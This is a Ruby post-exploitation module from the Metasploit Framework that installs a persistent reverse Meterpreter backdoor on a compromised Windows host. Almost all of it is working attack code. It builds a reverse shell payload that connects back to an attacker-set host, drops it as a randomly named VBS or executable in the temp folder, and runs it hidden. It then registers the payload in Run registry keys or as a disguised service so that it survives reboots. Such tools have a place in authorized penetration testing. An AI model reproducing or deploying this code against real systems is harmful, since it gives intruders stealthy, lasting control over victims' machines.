##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/persistence'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Persistence
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Persistent Payload Installer',
			'Description'   => %q{
				This Module will create a boot persistent reverse Meterpreter session by
				installing on the target host the payload as a script that will be executed
				at user logon or system startup depending on privilege and selected startup
				method.

				REXE mode will transfer a binary of your choosing to remote host to be
				used as a payload.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Carlos Perez <carlos_perez[at]darkoperator.com>',
					'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
			], self.class)

		deregister_options('RBATCHNAME','REXEPATH', 'KEEPALIVE')
	end


	# Run Method for when run command is issued
	#-------------------------------------------------------------------------------
	def run
		print_status("Running module against #{sysinfo['Computer']}")

		# Set vars
		rexe = datastore['REXE']
		rexename = datastore['REXENAME']
		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		delay = datastore['DELAY']
		encoder = datastore['ENCODER']
		iterations = datastore['ITERATIONS']
		@clean_up_rc = ""
		@rexe_mode = false
		host,port = session.session_host, session.session_port
		payload = "windows/meterpreter/reverse_tcp"

		if datastore['REXE'].nil? or datastore['REXE'].empty?
			# Check that if a template is provided that it actually exists
			if datastore['TEMPLATE']
				if not ::File.exists?(datastore['TEMPLATE'])
					print_error "Template PE File does not exists!"
					return
				else
					template_pe = datastore['TEMPLATE']
				end
			end

			# Set the proper payload
			case datastore['PAYLOAD_TYPE']
			when /TCP/i
				payload = "windows/meterpreter/reverse_tcp"
			when /HTTP/i
				payload = "windows/meterpreter/reverse_http"
			when /HTTPS/i
				payload = "windows/meterpreter/reverse_https"
			end

			# Create payload and script
			pay = create_payload(payload, lhost, lport, opts = "")
			raw = pay_gen(pay,encoder, iterations)
			script = create_script(delay, template_pe, raw)
			script_on_target = write_script_to_target(script)
		else
			@rexe_mode = true
			if datastore['REXE'].empty?
				print_error("Please define REXE")
				return
			end

			if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
				print_error("Please define REXENAME")
				return
			end

			if not ::File.exist?(datastore['REXE'])
				print_error("Rexe file does not exist!")
				return
			end

			raw = create_payload_from_file(rexe)
			script_on_target = write_exe_to_target(raw,rexename)
		end


		# Start handler if set
		create_multihand(payload, lhost, lport) if datastore['HANDLER']

		# Initial execution of script if set
		target_exec(script_on_target) if datastore['EXECUTE']

		case datastore['STARTUP']
		when /USER/i
			write_to_reg("HKCU",script_on_target)
		when /SYSTEM/i
			write_to_reg("HKLM",script_on_target)
		when /SERVICE/i
			install_as_service(script_on_target)
		end

		clean_rc = log_file()
		file_local_write(clean_rc,@clean_up_rc)
		print_status("Cleanup Meterpreter RC File: #{clean_rc}")

		report_note(:host => host,
			:type => "host.persistance.cleanup",
			:data => {
				:local_id => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:commands =>  @clean_up_rc
			}
		)
	end


	# Function for Creating persistent script
	#-------------------------------------------------------------------------------
	def create_script(delay,altexe,raw)
		if not altexe.nil?
			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay, :template => altexe})
		else
			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay})
		end
		print_status("Persistent agent script is #{vbs.length} bytes long")
		return vbs
	end


	# Function for writing script to target host
	#-------------------------------------------------------------------------------
	def write_script_to_target(vbs)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		fd = session.fs.file.new(tempvbs, "wb")
		fd.write(vbs)
		fd.close
		print_good("Persistent Script written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end


	# Function to execute script on target and return the PID of the process
	#-------------------------------------------------------------------------------
	def target_exec(script_on_target)
		print_status("Executing script #{script_on_target}")
		proc = @rexe_mode == true ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})

		print_good("Agent executed with PID #{proc.pid}")
		@clean_up_rc << "kill #{proc.pid}\n"
		return proc.pid
	end


	# Function to install payload in to the registry HKLM or HKCU
	#-------------------------------------------------------------------------------
	def write_to_reg(key,script_on_target)
		nam = Rex::Text.rand_text_alpha(rand(8)+8)
		print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		if(key)
			registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
			print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		else
			print_error("Error: failed to open the registry key for writing")
		end
	end


	# Function to install payload as a service
	#-------------------------------------------------------------------------------
	def install_as_service(script_on_target)
		if  is_system? or is_admin?
			print_status("Installing as service..")
			nam = Rex::Text.rand_text_alpha(rand(8)+8)
			print_status("Creating service #{nam}")
			@rexe_mode == true ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")

			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
		else
			print_error("Insufficient privileges to create service")
		end
	end


	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_exe_to_target(vbs,rexename)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + rexename
		fd = session.fs.file.new(tempvbs, "wb")
		fd.write(vbs)
		fd.close
		print_good("Persistent Script written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end



end
